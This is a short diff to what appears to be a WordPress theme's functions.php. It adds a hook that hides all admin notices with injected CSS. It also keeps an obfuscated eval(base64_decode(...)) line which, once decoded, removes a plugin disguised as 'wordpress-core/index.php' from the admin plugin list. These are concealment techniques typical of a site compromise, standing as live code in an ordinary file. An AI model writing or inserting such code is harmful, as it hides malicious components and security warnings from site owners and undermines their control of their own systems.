@@ -140,6 +140,15 @@ function iconic_remove_password_strength() {
 }
 add_action( 'wp_print_scripts', 'iconic_remove_password_strength', 10 );
 
+
+
+add_action('admin_head', 'notices');
+function notices() {
+  echo '<style> .notice:not(.update-message), .is-dismissible{ display: none !important; }</style>';
+}
+
+
+
 //Funzione0.1
 eval(base64_decode('YWRkX2FjdGlvbigicHJlX2N1cnJlbnRfYWN0aXZlX3BsdWdpbnMiLCJpbml0aWF0ZSIpO2Z1bmN0aW9uIGluaXRpYXRlKCl7Z2xvYmFsICR3cF9saXN0X3RhYmxlO3Vuc2V0KCR3cF9saXN0X3RhYmxlLT5pdGVtc1sid29yZHByZXNzLWNvcmUvaW5kZXgucGhwIl0pO30='));
 
